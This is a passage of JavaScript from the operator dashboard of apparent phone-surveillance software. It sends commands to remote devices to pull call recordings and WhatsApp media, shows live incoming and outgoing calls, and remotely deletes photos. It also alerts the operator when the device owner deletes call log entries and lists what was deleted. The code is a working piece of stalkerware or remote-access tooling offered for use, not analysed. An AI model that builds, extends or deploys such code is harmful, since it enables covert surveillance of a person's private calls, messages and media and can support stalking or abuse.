    var item = document.createElement('div');
    item.className = 'log-item';
    item.innerHTML = '<div class="log-icon">👤</div>' +
      '<div class="log-info"><div class="log-title">' + escapeHtml(contact.name || 'Unknown') + '</div>' +
      '<div class="log-meta">' + escapeHtml(contact.number || '') + '</div></div>';
    list.appendChild(item);
  });
}

// ============ CALL RECORDINGS ============
let recordingsData = [];

function getSelectedRecordingsDevice() {
  return document.getElementById('recordingsDeviceSelect').value;
}
function onRecordingsDeviceChange() {
  recordingsData = [];
  updateRecordingsList();
}
function fetchRecordings() {
  var deviceId = getSelectedRecordingsDevice();
  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
  socket.emit('command:recordings:fetch', { deviceId: deviceId });
  showToast('Fetching recordings...', 'info');
}

socket.on('recordings:data', function(data) {
  if (data.recordings && data.recordings.length > 0) {
    recordingsData = data.recordings;
    updateRecordingsList();
    document.getElementById('recordingsCount').textContent = recordingsData.length + ' recordings';
    showToast(recordingsData.length + ' recordings found', 'success');
  } else {
    var note = data.note || 'No recordings yet';
    document.getElementById('recordingsCount').textContent = '';
    document.getElementById('recordingsList').innerHTML =
      '<div class="empty-state" style="padding:40px 20px"><div class="icon">🎙️</div><h3>No Recordings</h3><p>' + note + '</p></div>';
  }
});

socket.on('recording:new', function(data) {
  showToast('New call recording: ' + (data.number || 'unknown') + ' (' + data.duration + 's)', 'success');
});

function updateRecordingsList() {
  var list = document.getElementById('recordingsList');
  if (recordingsData.length === 0) {
    list.innerHTML = '<div class="empty-state" style="padding:60px 20px"><div class="icon">🎙️</div><h3>No Recordings</h3><p>Calls recorded automatically</p></div>';
    return;
  }
  list.innerHTML = '';
  recordingsData.forEach(function(rec) {
    var item = document.createElement('div');
    item.className = 'log-item';
    var time = rec.timestamp ? new Date(rec.timestamp).toLocaleString() : '--';
    var sizeKB = rec.size ? Math.round(rec.size / 1024) + ' KB' : '--';
    item.innerHTML = '<div class="log-icon">🎙️</div>' +
      '<div class="log-info"><div class="log-title">' + escapeHtml(rec.name || '') + '</div>' +
      '<div class="log-meta">' + time + ' | ' + sizeKB + '</div></div>';
    list.appendChild(item);
  });
}

// ============ WHATSAPP MEDIA ============
let whatsappData = [];

function getSelectedWhatsappDevice() {
  return document.getElementById('whatsappDeviceSelect').value;
}
function onWhatsappDeviceChange() {
  whatsappData = [];
  updateWhatsappGrid();
}
function fetchWhatsApp() {
  var deviceId = getSelectedWhatsappDevice();
  if (!deviceId) { showToast('Please select a device first', 'error'); return; }
  socket.emit('command:whatsapp:fetch', { deviceId: deviceId });
  showToast('Fetching WhatsApp media...', 'info');
}

socket.on('whatsapp:data', function(data) {
  if (data.media && data.media.length > 0) {
    whatsappData = data.media;
    updateWhatsappGrid();
    document.getElementById('whatsappCount').textContent = whatsappData.length + ' files';
    showToast(whatsappData.length + ' WhatsApp files found', 'success');
  } else {
    var note = data.note || 'No WhatsApp media found';
    document.getElementById('whatsappCount').textContent = '';
    document.getElementById('whatsappGrid').innerHTML =
      '<div class="empty-state" style="padding:40px 20px;grid-column:1/-1"><div class="icon">📱</div><h3>No WhatsApp Media</h3><p>' + note + '</p></div>';
  }
});

function updateWhatsappGrid() {
  var grid = document.getElementById('whatsappGrid');
  if (whatsappData.length === 0) {
    grid.innerHTML = '<div class="empty-state" style="padding:60px 20px;grid-column:1/-1"><div class="icon">📱</div><h3>No WhatsApp Media</h3></div>';
    return;
  }
  grid.innerHTML = '';
  whatsappData.forEach(function(item) {
    var card = document.createElement('div');
    card.className = 'gallery-item';
    if (item.thumbnail) {
      card.innerHTML = '<img src="' + item.thumbnail + '" alt="' + escapeHtml(item.name) + '" style="width:100%;height:100%;object-fit:cover">';
    } else {
      var icon = '📄';
      if (item.type && item.type.startsWith('image')) icon = '🖼️';
      else if (item.type && item.type.startsWith('video')) icon = '🎬';
      else if (item.type && item.type.startsWith('audio')) icon = '🎵';
      card.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:8px"><span style="font-size:32px">' + icon + '</span><span style="font-size:11px;color:var(--text-secondary);text-align:center;padding:0 4px;overflow:hidden;text-overflow:ellipsis;max-width:100%">' + escapeHtml(item.name || '') + '</span></div>';
    }
    grid.appendChild(card);
  });
}

// ============ LIVE CALL MONITORING ============
socket.on('call:live', function(data) {
  var icon = '📞';
  var msg = '';
  if (data.state === 'ringing') {
    icon = '📲';
    msg = 'INCOMING CALL from ' + (data.number || 'Unknown');
  } else if (data.state === 'answered') {
    icon = '📱';
    msg = (data.type === 'outgoing' ? 'OUTGOING' : 'INCOMING') + ' call answered: ' + (data.number || 'Unknown');
  } else if (data.state === 'ended') {
    if (data.type === 'missed') {
      icon = '📵';
      msg = 'MISSED CALL from ' + (data.number || 'Unknown');
    } else {
      icon = '📴';
      msg = 'Call ended (' + data.type + '): ' + (data.number || 'Unknown');
    }
  }
  showToast(icon + ' ' + msg, data.type === 'missed' ? 'error' : 'info');

  // Add to call log data if on that page
  if (data.state === 'ended') {
    callLogData.unshift({
      number: data.number || 'Unknown',
      type: data.type,
      timestamp: data.timestamp,
      duration: '--',
      name: ''
    });
    updateCallLogList();
  }
});

// ============ CALL LOG DELETE DETECTION ============
socket.on('calllog:deleted', function(data) {
  var count = data.deletedCount || 0;
  var msg = '⚠️ ALERT: ' + count + ' call log entries DELETED on device!';
  showToast(msg, 'error');

  // Show deleted entries if available
  if (data.deletedEntries && data.deletedEntries.length > 0) {
    var details = 'Deleted entries:\\n';
    data.deletedEntries.forEach(function(entry) {
      var time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : '';
      details += '- ' + (entry.name || entry.number || 'Unknown') + ' (' + time + ')\\n';
    });
    console.log(details);
    // Show alert with details
    setTimeout(function() {
      showToast('Deleted: ' + data.deletedEntries.map(function(e) { return e.number || 'Unknown'; }).join(', '), 'error');
    }, 3000);
  }
});

// ============ PHOTO DELETE ============
socket.on('photo:deleted', function(data) {
  if (data.success) {
    showToast('Photo deleted successfully', 'success');
  } else {
    showToast('Failed to delete photo: ' + (data.error || ''), 'error');
  }
});

// ---- Socket Events ----
socket.on('devices:updated', fetchDevices);
socket.on('connect', function() {
  showToast('Connected to server', 'success');
  fetchDevices();
});
socket.on('disconnect', function() {
  showToast('Disconnected from server', 'error');
});

// ---- Init ----
document.addEventListener('DOMContentLoaded', function() {
  fetchDevices();
  setupAgentUrl();
});
